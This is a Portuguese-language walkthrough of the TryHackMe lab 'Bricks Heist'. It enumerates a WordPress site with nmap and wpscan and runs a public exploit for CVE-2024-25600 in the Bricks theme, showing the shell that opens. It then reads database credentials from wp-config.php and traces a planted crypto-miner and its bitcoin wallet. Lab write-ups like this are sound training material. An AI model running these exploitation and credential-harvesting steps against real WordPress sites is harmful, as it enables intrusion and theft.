> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/writeups/tryhackme/tryhack3m-bricks-heist.md).

# TryHack3M: Bricks Heist

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2F2Tlmep67dZSTRVwp0uWF%2Fimage.png?alt=media&amp;token=73e1ffe8-8234-4ac7-acb5-d9f5db6cc4b0" alt="" width="375"><figcaption></figcaption></figure>

{% embed url="<https://tryhackme.com/r/room/tryhack3mbricksheist>" %}

**Classificação** : Fácil

**Criadores** :  [umairalizafar](https://tryhackme.com/p/umairalizafar), [ujohn](https://tryhackme.com/p/ujohn), [l000g1c](https://tryhackme.com/p/l000g1c)

**Ferramentas** : nmap, wpscan

Adicionar `bricks.thm` no arquivo /etc/hosts

```sh
$ echo '10.10.31.7 bricks.thm' >> /etc/hosts
```

### Enumeração

Enumeração de portas com o nmap

```sh
# nmap -sS -sV -Pn bricks.thm
Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-27 19:30 UTC
Nmap scan report for bricks.thm (10.10.31.7)
Host is up (0.0071s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     WebSockify Python/3.8.10
443/tcp  open  ssl/http Apache httpd
3306/tcp open  mysql    MySQL (unauthorized)

```

Visitamos o site <https://bricks.thm/> mas não havia nada exceto um tijolo, notamos que o site usa o cms `wordpress`

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FpsAg3jkDHD4vbbXKazjs%2FCaptura%20de%20ecra%CC%83%202024-05-27%2C%20a%CC%80s%2016.44.17.png?alt=media&amp;token=d85fa216-3d0f-4e8b-800c-66179dba7d9d" alt=""><figcaption></figcaption></figure>

Depois de identificar o cms, devemos verificar o site com o wpscan

```
# wpscan --url https://bricks.thm/ --disable-tls-checks
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: https://bricks.thm/ [10.10.31.7]
[+] Started: Mon May 27 19:53:12 2024
                                  ...SNIP...
[+] WordPress theme in use: bricks
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.9.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: 'Version: 1.9.5'

```

Identifcamos a versão do tema usado pelo site `bricks 1.9.5`  e pesquisamos por um exploit no google, e baixamos o [exploit](https://github.com/Tornad0007/CVE-2024-25600-Bricks-Builder-plugin-for-WordPress/blob/main/exploit.py)&#x20;

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FL3y2Oef4pTyv9lTslATr%2F1.png?alt=media&amp;token=6c4d2373-b06c-4f28-9d94-e9f842b9455f" alt=""><figcaption></figcaption></figure>

Executamos o exploit&#x20;

```sh
# python3 exploit.py -u https://bricks.thm/
[*] Nonce found: 9492f77962
[+] https://bricks.thm/ is vulnerable to CVE-2024-25600, apache
[!] Shell is ready, please type your commands UwU
# ls
650c844110baced87e1606453b93f22a.txt
                                ...SNIP...

```

O arquivo `wp-config.php` nos revela as credencias de acesso

```
# cat wp-config.php

/** Database username */
define( 'DB_USER', 'root' );

/** Database password */
define( 'DB_PASSWORD', '<REDACTED>' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

```

Para usar isso, pode-se acessar `https://bricks.thm/phpmyadmin`e fazer login com estas credenciais:

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FCLo2QUo5IxGWbnIhLYV6%2FCaptura%20de%20ecra%CC%83%202024-05-27%2C%20a%CC%80s%2017.24.28.png?alt=media&amp;token=9fce79fc-a685-43d6-9785-6f373e012b38" alt=""><figcaption></figcaption></figure>

Dará acesso ao portal de administração de onde é possível alterar as configurações, fazer login no *painel **wp-admin*** e muito mais.

Procuramos por processos em execução no momento, rodamos o comando no terminal na máquina comprometida

```
systemctl --type=service --state=running
```

Após listar os processos, descobrimos um processo estranho

```
  ubuntu.service                                 loaded active running TRYHACK3M                                                       
```

Isso fornece o nome do serviço afiliado ao processo suspeito.

```sh
#systemctl cat ubuntu.service
# /etc/systemd/system/ubuntu.service
[Unit]
Description=TRYHACK3M

[Service]
Type=simple
ExecStart=/lib/NetworkManager/<REDACTED>
Restart=on-failure

[Install]
WantedBy=multi-user.target 
```

O serviço está sendo executado no arquivo `/lib/NetworkManager`&#x20;

{% code overflow="wrap" %}

```sh
# head  /lib/NetworkManager/inet.conf

ID:5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
2024-04-08 10:46:04,743 [*] confbak: Ready!
2024-04-08 10:46:04,743 [*] Status: Mining!
2024-04-08 10:46:08,745 [*] Miner()

```

{% endcode %}

Estava mostrando todos os logs armazenados o que confirma que o arquivo de log que estamos pesquisando é para a instância do minerador é `inet.conf`***.***

Vamos copiá-lo e tentar decodificá-lo ***no***[ Cyberchef ***:***](https://gchq.github.io/CyberChef/)

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FNnI7YC9jwp3HyCQWucFC%2FCaptura%20de%20ecra%CC%83%202024-05-27%2C%20a%CC%80s%2017.46.06.png?alt=media&amp;token=03dedc7c-a2f2-4c54-a69d-c89cf7c0985d" alt=""><figcaption></figcaption></figure>

Aqui, algo era incomum. Podemos ver os termos repetindo-os depois de um certo ponto. Desde então, estamos em busca do *endereço da carteira.*

O endereço que temos é maior que 62. Então dividi eles em duas partes:

```
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
bc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa
```

Podemos verificar online se o endereço é válido ou não. Entrei em [***blockchair.com***](https://blockchair.com/) e colei o endereço provável para pesquisar:

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FBfgVZ5qmwR8zWIfU0UtS%2FCaptura%20de%20ecra%CC%83%202024-05-27%2C%20a%CC%80s%2017.52.39.png?alt=media&amp;token=8e9d3010-be67-4025-9dfe-c26a8cc154a6" alt=""><figcaption></figcaption></figure>

O endereço é válido, descendo para o final da página, nos revela uma transação, e vericamos isso com mais detalhes

Podemos ver os detalhes das transações, como remetente e destinatário:

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FZnTu6f4HgaoEay4Jnr64%2FCaptura%20de%20ecra%CC%83%202024-05-27%2C%20a%CC%80s%2017.55.39.png?alt=media&amp;token=e9fe8011-c606-4f1e-ab81-6b67094b0b50" alt=""><figcaption></figcaption></figure>

Basta copiar o endereço do remetente e pesquisar no Google:

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2Fa5Mxjqie7erwMZoTLew2%2FCaptura%20de%20ecra%CC%83%202024-05-27%2C%20a%CC%80s%2018.04.44.png?alt=media&amp;token=ff0844d9-0bcb-41b7-959e-61dc0374b778" alt=""><figcaption></figcaption></figure>

Neste primeiro link, descobriremos a última resposta, FIM!
